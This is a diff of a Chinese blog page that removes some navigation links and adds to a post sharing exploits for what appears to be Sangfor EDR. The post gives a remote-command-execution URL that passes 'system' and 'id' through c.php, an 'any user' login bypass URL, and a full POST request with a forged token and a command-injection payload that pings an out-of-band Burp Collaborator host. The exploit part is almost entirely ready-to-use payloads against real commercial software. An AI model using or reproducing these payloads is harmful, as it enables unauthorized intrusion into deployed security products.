@@ -243,13 +243,6 @@
                       </li>
                     
                       <li>
-                        <a href="/bangumi/">
-                          <i class="fa fa-film faa-vertical" aria-hidden="true"></i>
-                          番组
-                        </a>
-                      </li>
-                    
-                      <li>
                         <a href="/music/">
                           <i class="fa fa-headphones" aria-hidden="true"></i>
                           歌单
@@ -265,16 +258,6 @@
                   <span class="faa-parent animated-hover">
                     <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
                     友人帐
-                  </span>
-                </a>
-                
-              </li>
-            
-              <li>
-                <a href="/donate/">
-                  <span class="faa-parent animated-hover">
-                    <i class="fa  fa-heart faa-pulse" aria-hidden="true"></i>
-                    赞赏
                   </span>
                 </a>
                 
@@ -379,13 +362,24 @@
         
         <div class="entry-content">
           <h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p>参数位置</p>
-<pre><code class="markdown">https://xxx.com:xxx/tool/log/c.php?strip_slashes=system&amp;host=id</code></pre>
+<pre><code class="url">https://xxx.com:xxx/tool/log/c.php?strip_slashes=system&amp;host=id</code></pre>
 <p>其他几个都没什么用</p>
 <h1 id="任意用户登录"><a href="#任意用户登录" class="headerlink" title="任意用户登录"></a>任意用户登录</h1><p>参数位置</p>
-<pre><code>https://xxx.com:xxx/ui/login.php?user=admin</code></pre><p>这里输入任意用户都能登录</p>
+<pre><code class="url">https://xxx.com:xxx/ui/login.php?user=admin</code></pre>
+<p>这里输入任意用户都能登录</p>
 <p>PS:</p>
 <p>我再交CNVD我就是憨憨，交了一堆全给0分，那我fofa高级会员不是被白嫖了。</p>
-<h1 id="9月11日后续补充"><a href="#9月11日后续补充" class="headerlink" title="9月11日后续补充"></a>9月11日后续补充</h1><h2 id="RCE-1"><a href="#RCE-1" class="headerlink" title="RCE"></a>RCE</h2>
+<h1 id="9月11日后续补充"><a href="#9月11日后续补充" class="headerlink" title="9月11日后续补充"></a>9月11日后续补充</h1><h2 id="RCE-1"><a href="#RCE-1" class="headerlink" title="RCE"></a>RCE</h2><p>参数位置</p>
+<pre><code class="TEXT">POST /api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9 HTTP/1.1
+Host: xx.xxx.xx.xx:8443
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36
+Content-Length: 89
+Connection: close
+
+{&quot;params&quot;: &quot;w=1\&quot;&#39;test&#39;\&quot;|ping n5tcbkdcgf8hlj7xjc7578yau10soh.burpcollaborator.net&quot;}</code></pre>
+<p>只要解码为{md5:true}即可</p>
+
         </div>
         <!-- .entry-content -->
         <div class="single-reward">
@@ -692,13 +686,6 @@ $(document).ready(function() {
               </li>
             
               <li>
-                <a href="/bangumi/">
-                  <i class="fa fa-film faa-vertical" aria-hidden="true"></i>
-                  番组
-                </a>
-              </li>
-            
-              <li>
                 <a href="/music/">
                   <i class="fa fa-headphones" aria-hidden="true"></i>
                   歌单
@@ -714,16 +701,6 @@ $(document).ready(function() {
           <span class="faa-parent animated-hover">
             <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
             友人帐
-          </span>
-        </a>
-        
-      </li>
-    
-      <li>
-        <a href="/donate/">
-          <span class="faa-parent animated-hover">
-            <i class="fa  fa-heart faa-pulse" aria-hidden="true"></i>
-            赞赏
           </span>
         </a>
         
